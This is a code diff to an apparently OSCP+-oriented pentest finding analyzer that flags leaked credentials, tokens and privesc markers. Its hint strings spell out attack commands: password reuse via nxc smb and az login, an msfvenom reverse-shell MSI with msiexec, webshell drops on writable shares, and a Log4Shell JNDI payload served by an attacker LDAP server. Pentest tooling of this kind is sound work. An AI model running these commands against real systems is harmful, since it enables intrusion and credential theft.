@@ -10514,13 +10723,17 @@ def analyze(path, report, store=None):
                             "nt": ("Notion integration token", "flag intel"),
                             "sq": ("Square API token", "flag intel"),
                             "do": ("DigitalOcean token",
+                                   "intel only on the exam (DigitalOcean "
+                                   "API is out of scope); real engagement: "
                                    "doctl auth init -t <tok>"),
                             "nv": ("NVIDIA API key", "flag intel"),
                             "SG": ("Sendgrid API key",
                                    "phish-vector; flag intel"),
                             "pa": ("Airtable PAT", "flag intel"),
                             "gi": ("GitHub fine-grained PAT",
-                                   "curl -H 'Authorization: token <tok>' "
+                                   "intel only on the exam (api.github.com "
+                                   "is out of scope); real engagement: curl "
+                                   "-H 'Authorization: token <tok>' "
                                    "https://api.github.com/user"),
                         }
                         provider, phint = _PROVIDER_HINTS_LINE.get(prefix,
@@ -11023,10 +11236,16 @@ def analyze(path, report, store=None):
                         _pw_sh_az = pw.replace("'", "'\\''")
                         report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                    f"shell history az login: {u}:{pw}",
-                                   hint=(f"Azure CLI cred; validate offline "
-                                         f"(check user domain / tenant); reuse "
-                                         f"as O365 / M365 / Entra ID login: "
-                                         f"az login -u '{_u_sh_az}' -p '{_pw_sh_az}'"))
+                                   # iter-311 (D1-25): cloud identity is
+                                   # out of scope on the exam.
+                                   hint=(f"Azure CLI cred - cloud identity is "
+                                         f"out of scope on the OSCP+ exam: "
+                                         f"treat as intel; reuse the PASSWORD "
+                                         f"against in-scope hosts: nxc smb "
+                                         f"<host> -u '<user>' -p '{_pw_sh_az}'"
+                                         f"  |  real engagement (in scope "
+                                         f"only): az login -u '{_u_sh_az}' -p "
+                                         f"'{_pw_sh_az}'"))
                         if store is not None:
                             from analyzers.ingest.evidence import Evidence
                             store.add(Evidence(kind="plaintext", user=u,
@@ -11871,7 +12090,9 @@ def analyze(path, report, store=None):
                         tok = am.group(1)
                         report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                    f"Azure access token: {tok[:40]}...",
-                                   hint="paste into az or use roadtools/aztoken; check token claims via jwt.io for tenant + roles")
+                                   # iter-311 (D1-17): decode locally, never
+                                   # via a third-party web form.
+                                   hint="decode claims OFFLINE for tenant (tid) + roles/scp: echo '<tok>' | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool  |  cloud identity is out of scope on the OSCP+ exam - treat as intel; in a real engagement use roadtools/aztoken within scope")
                         hit = True
                         break
                     if name == "supervisord inet creds":
@@ -11966,7 +12187,10 @@ def analyze(path, report, store=None):
                         blob = am.group(1)
                         report.add("HIGH", "INTERESTING FILES", path, lineno,
                                    f"PSCredential Export-Clixml DPAPI blob ({len(blob)//2}B)",
-                                   hint="recoverable ONLY by the same user+host: powershell -c 'Import-Clixml cred.xml | %{ \$_.GetNetworkCredential().Password }'")
+                                   # iter-311 (D1-14): the old text had an
+                                   # invalid `\$` Python escape and a
+                                   # single-quoted body cmd.exe would echo.
+                                   hint="recoverable ONLY by the same user+host (DPAPI-bound) - on that box run: powershell -c \"(Import-Clixml cred.xml).GetNetworkCredential().Password\"")
                         hit = True
                         break
                     if name == "ovpn auth-user-pass":
@@ -12000,10 +12224,25 @@ def analyze(path, report, store=None):
                                    hint=hint)
                         hit = True
                         break
+                    if (_priv_table_owned
+                            and name in _PRIV_MARKER_NAMES
+                            and any(rx.match(line) for rx in _priv_row_rx)):
+                        # table row -> privesc.py emits the PRIVESC finding
+                        hit = True
+                        break
                     if name == "token impersonation":
-                        report.add("HIGH", "INTERESTING FILES", path, lineno,
+                        # iter-311 (C): the bare-string marker is demoted to a
+                        # MEDIUM "tooling reference". The CRITICAL privesc
+                        # finding now comes from the `whoami /priv` table
+                        # detector in _multiline_passes (header-gated,
+                        # row-anchored, Evidence kind=privesc_vector).
+                        report.add("MEDIUM", "INTERESTING FILES", path, lineno,
                                    "SeImpersonate / token-impersonation tooling reference",
-                                   hint="if running as a service account: PrintSpoofer / GodPotato / JuicyPotato -> SYSTEM")
+                                   hint=("context only - a real `whoami /priv` row (with the "
+                                         "PRIVILEGES INFORMATION header) raises the CRITICAL "
+                                         "'SeImpersonatePrivilege held' finding with the "
+                                         "Potato-family next step; otherwise note the tool name "
+                                         "and run `whoami /priv` on the box"))
                         hit = True
                         break
                     # iter-163: high-value Windows privileges. Each maps to a
@@ -12088,17 +12327,19 @@ def analyze(path, report, store=None):
                         hit = True
                         break
                     if name == "AlwaysInstallElevated":
-                        # iter-16: replaced msfvenom hint - msfvenom-generated
-                        # payloads DO count toward the OSCP+ 1-target Metasploit
-                        # quota even when run locally. Prefer non-MSF MSI gen so
-                        # the AlwaysInstallElevated privesc costs zero MSF budget.
+                        # iter-311 (D1-21): msfvenom with a NON-meterpreter
+                        # payload is unlimited on every target (official
+                        # guide; compliance.py iter-310) - only a meterpreter
+                        # payload binds the one MSF target. The msfvenom MSI
+                        # is therefore the simplest exam-legal path.
                         report.add("CRITICAL", "RECON", path, lineno,
                                    "AlwaysInstallElevated = 1 (SYSTEM via MSI)",
-                                   hint=("non-MSF MSI: WiX (candle+light) wrapping a PowerShell/nim/Go "
-                                         "reverse shell; OR write a small C# Installer-class .msi. "
-                                         "Then: msiexec /quiet /qn /i evil.msi   "
-                                         "(spends 0 MSF budget; msfvenom-generated payloads count toward "
-                                         "the 1-target OSCP+ Metasploit limit)"))
+                                   hint=("msfvenom -p windows/x64/shell_reverse_tcp LHOST=<you> "
+                                         "LPORT=4444 -f msi -o evil.msi  (non-meterpreter = "
+                                         "quota-free); then msiexec /quiet /qn /i evil.msi  |  "
+                                         "no-msfvenom alt: WiX (candle+light) wrapping a "
+                                         "PowerShell/nim/Go reverse shell or a C# Installer-class "
+                                         ".msi"))
                         hit = True
                         break
                     if name == "Snaffler red":
@@ -12115,7 +12356,15 @@ def analyze(path, report, store=None):
                         share, access = am.group(1), am.group(2)
                         report.add("HIGH", "RECON", path, lineno,
                                    f"smbmap writable share: {share} ({access})",
-                                   hint=f"smbclient //<host>/{share} -U <user>%<pw>  -> put files / NTLM-trigger SCF / WAR drop")
+                                   # iter-311 (D1-01): the SCF/URL-file lure only
+                                   # pays off with a NetNTLM capture/relay server
+                                   # (spoofing class) - [LAB-ONLY], never a plain
+                                   # next step.
+                                   hint=(f"smbclient //<host>/{share} -U '<user>%<pw>' -c 'put <file>'  "
+                                         f"-> writable share: drop a webshell/WAR if the share maps to a "
+                                         f"webroot, or plant a payload a scheduled task / logon script "
+                                         f"executes  |  [LAB-ONLY] SCF/URL-file NTLM-capture lure (needs "
+                                         f"a NetNTLM capture/relay server - spoofing class, exam-forbidden)"))
                         hit = True
                         break
                     if name == "kerbrute valid user":
@@ -12187,6 +12436,17 @@ def analyze(path, report, store=None):
                         # the lookup key so no dict entry ever matched.
                         _caps_raw = cap.split("+")[0].split("=")[0]
                         _caps_list = [c.strip() for c in _caps_raw.split(",")]
+                        # iter-311: network-only caps (cap_net_raw /
+                        # cap_net_bind_service / cap_net_admin) ship on
+                        # every distro's ping/mtr-packet/arping/gst-ptp-
+                        # helper and are not an escalation path. Firing
+                        # HIGH on them buried the real cap_setuid row.
+                        _NET_ONLY = {"cap_net_raw", "cap_net_bind_service",
+                                     "cap_net_admin"}
+                        if _caps_list and all(c in _NET_ONLY
+                                              for c in _caps_list):
+                            hit = True
+                            break
                         _cap_name = _caps_raw
                         _cap_hint = None
                         for _cn in _caps_list:
@@ -12321,9 +12581,16 @@ def analyze(path, report, store=None):
                             continue
                         report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                    "Log4Shell JNDI injection (CVE-2021-44228)",
-                                   hint=("verify target: nslookup test.<unique>.dnslog.cn from victim; "
-                                         "manual PoC: ldap server (marshalsec) on attacker, "
-                                         "${jndi:ldap://<you>:1389/<class>}; OSCP+ legal as single-target"))
+                                   # iter-311 (D1-10): no third-party OOB service
+                                   # (exam targets have no internet egress and it
+                                   # leaks target identifiers) - YOUR listener only.
+                                   hint=("verify OOB callback against YOUR listener only: on Kali "
+                                         "`sudo tcpdump -ni tun0 udp port 53 or tcp port 1389` then "
+                                         "send ${jndi:ldap://<your-tun0-ip>:1389/x} in the injectable "
+                                         "header; manual PoC: attacker-side LDAP ref server (marshalsec) "
+                                         "+ Exploit.class served over python3 -m http.server; OSCP+ "
+                                         "legal as single-target, no third-party OOB services "
+                                         "(dnslog/interactsh)"))
                         hit = True
                         break
                     if name == "Spring4Shell classLoader":
@@ -12858,7 +13125,9 @@ def analyze(path, report, store=None):
                         tok = am.group(1)
                         report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                    f"AAD/MSA refresh token: {tok[:30]}...",
-                                   hint="exchange for access token: TokenTactics / ROADtools; FOCI=1 means it works for ANY 1P app")
+                                   # iter-311 (D1-25): cloud identity is out of
+                                   # scope on the exam.
+                                   hint="cloud identity is out of scope on the OSCP+ exam - treat as intel (do not redeem it against login.microsoftonline.com); real engagement (in scope): exchange for an access token via TokenTactics / ROADtools; FOCI=1 means it works for ANY 1P app")
                         hit = True
                         break
                     if name == "AAD FOCI marker":
